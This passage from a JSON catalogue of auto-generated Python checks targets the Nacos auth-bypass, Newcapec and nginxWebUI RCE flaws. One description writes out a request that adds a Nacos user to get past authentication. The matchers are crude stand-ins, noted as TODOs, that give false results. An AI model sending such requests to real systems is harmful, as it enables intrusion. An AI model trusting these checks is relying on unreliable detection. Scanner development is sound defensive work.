            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nacos-auth-bypass\nName: Nacos 1.x - Authentication Bypass\nSeverity: critical\nDescription: Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nacos_auth_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nacos-auth-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"Nacos 1.x - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"totalCount\":, \"username\":, \"password\":\\' | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"totalCount\":, \"username\":, \"password\":', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Nacos 1.x - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nacos_auth_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nacos-auth-bypass\nName: Nacos 1.x - Authentication Bypass\nSeverity: critical\nDescription: Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nacos_auth_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nacos-auth-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"Nacos 1.x - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"totalCount\":, \"username\":, \"password\":\\' | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"totalCount\":, \"username\":, \"password\":', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Nacos 1.x - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nacos_auth_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "nacos",
          "auth-bypass",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_newcapec_rce",
        "name": "Newcapec - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Newcapec front-end service management platform service.action interface has a remote command execution vulnerability, attackers can use the vulnerability to obtain server permissions.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(header_1, \"text/plain\") && contains(header_2, \"text/plain\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "file",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: file",
            "default": "{{rand_base(5)}}"
          },
          {
            "name": "data",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: data",
            "default": "{{randstr}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: newcapec-rce\nName: Newcapec - Remote Code Execution\nSeverity: critical\nDescription: Newcapec front-end service management platform service.action interface has a remote command execution vulnerability, attackers can use the vulnerability to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_newcapec_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"newcapec-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Newcapec - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(header_1, \"text/plain\") && contains(header_2, \"text/plain\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Newcapec - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_newcapec_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: newcapec-rce\nName: Newcapec - Remote Code Execution\nSeverity: critical\nDescription: Newcapec front-end service management platform service.action interface has a remote command execution vulnerability, attackers can use the vulnerability to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_newcapec_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"newcapec-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Newcapec - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(header_1, \"text/plain\") && contains(header_2, \"text/plain\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Newcapec - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_newcapec_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "newcapec",
          "rce",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_nginx_webui_rce",
        "name": "nginxWebUI ≤ 3.5.0 - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is a command execution vulnerability in the nginxWebUI backend. After logging in to the backend, the attacker can execute any command to obtain server permissions.",
        "severity": "critical",
        "detection": "[AND] regex ['uid=\\\\d+\\\\(([^)]+)\\\\) gid=\\\\d+\\\\(([^)]+)\\\\)'] | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: nginx-webui-rce\nName: nginxWebUI ≤ 3.5.0 - Remote Command Execution\nSeverity: critical\nDescription: There is a command execution vulnerability in the nginxWebUI backend. After logging in to the backend, the attacker can execute any command to obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_nginx_webui_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"nginx-webui-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"nginxWebUI ≤ 3.5.0 - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\)'] | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\(([^)]+)\\\\\\\\)', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"nginxWebUI ≤ 3.5.0 - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_nginx_webui_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
